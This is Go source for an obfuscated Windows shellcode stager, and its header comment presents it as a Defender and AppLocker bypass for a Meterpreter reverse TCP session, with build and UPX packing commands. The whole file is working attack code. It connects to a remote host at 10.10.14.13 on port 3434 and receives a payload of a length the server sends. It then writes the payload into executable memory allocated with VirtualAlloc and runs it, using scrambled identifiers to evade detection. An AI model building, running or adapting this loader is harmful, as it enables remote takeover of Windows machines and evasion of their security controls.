/*
chris.downs[at]reticulipictures.com
obfuscated defender / applocker bypass
Microsoft Windows Server 2019 Standard
10.0.17763 N/A Build 17763
64bit reverse -
windows/x64/meterpreter/reverse_tcp

GOOS=windows GOARCH=amd64 go build 3fb7Jq79.go
upx brute 3fb7Jq79.exe
*/

package main

import (
	"encoding/binary"
	"syscall"
	"unsafe"
)

const (
	lXMIZpS         = 0x1000
	VcLxmtJ         = 0x2000
	wayikvgQuwZOKRY = 0x40
)

var (
	TpsRJyKj = syscall.NewLazyDLL("kernel32.dll")
	HeBbAJo  = TpsRJyKj.NewProc("VirtualAlloc")
)

func ZOSUxNefsYMzpvV(lLQsWhDNLkJ uintptr) (uintptr, error) {
	RUguHNXDNuh, _, ZzdnsKGXsnEJSOb := HeBbAJo.Call(0, lLQsWhDNLkJ, VcLxmtJ|lXMIZpS, wayikvgQuwZOKRY)
	if RUguHNXDNuh == 0 {
		return 0, ZzdnsKGXsnEJSOb
	}
	return RUguHNXDNuh, nil
}
func main() {
	const pYlbbgvvOrhAHhS = 1000 << 10
	var SETPHNv syscall.WSAData
	syscall.WSAStartup(uint32(0x202), &SETPHNv)
	wyebwJYVHXfDdb, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	XNtaMXsXZ := syscall.SockaddrInet4{Port: 3434, Addr: [4]byte{10, 10, 14, 13}}
	syscall.Connect(wyebwJYVHXfDdb, &XNtaMXsXZ)
	var bHGgnYW [4]byte
	VmUBlihof := syscall.WSABuf{Len: uint32(4), Buf: &bHGgnYW[0]}
	vaHYArAaywVWGg := uint32(0)
	jDPnsWnMeqyaLmb := uint32(0)
	syscall.WSARecv(wyebwJYVHXfDdb, &VmUBlihof, 1, &jDPnsWnMeqyaLmb, &vaHYArAaywVWGg, nil, nil)
	mdIVYDZdxBXzau := binary.LittleEndian.Uint32(bHGgnYW[:])
	HiPqRgExpeNf := make([]byte, mdIVYDZdxBXzau)
	var EtplhZEubJ []byte
	VmUBlihof = syscall.WSABuf{Len: mdIVYDZdxBXzau, Buf: &HiPqRgExpeNf[0]}
	vaHYArAaywVWGg = uint32(0)
	jDPnsWnMeqyaLmb = uint32(0)
	vwJWSE := uint32(0)
	for vwJWSE < mdIVYDZdxBXzau {
		syscall.WSARecv(wyebwJYVHXfDdb, &VmUBlihof, 1, &jDPnsWnMeqyaLmb, &vaHYArAaywVWGg, nil, nil)
		for i := 0; i < int(jDPnsWnMeqyaLmb); i++ {
			EtplhZEubJ = append(EtplhZEubJ, HiPqRgExpeNf[i])
		}
		vwJWSE += jDPnsWnMeqyaLmb
	}
	dbosNYg, _ := ZOSUxNefsYMzpvV(uintptr(mdIVYDZdxBXzau + 5))
	jtXOajZJPxRjsU := (*[pYlbbgvvOrhAHhS]byte)(unsafe.Pointer(dbosNYg))
	xERsTYZ := (uintptr)(unsafe.Pointer(wyebwJYVHXfDdb))
	jtXOajZJPxRjsU[0] = 0xBF
	jtXOajZJPxRjsU[1] = byte(xERsTYZ)
	jtXOajZJPxRjsU[2] = 0x00
	jtXOajZJPxRjsU[3] = 0x00
	jtXOajZJPxRjsU[4] = 0x00
	for jOxXGfFyginsO, zeNNNv := range EtplhZEubJ {
		jtXOajZJPxRjsU[jOxXGfFyginsO+5] = zeNNNv
	}
	syscall.Syscall(dbosNYg, 0, 0, 0, 0)
}
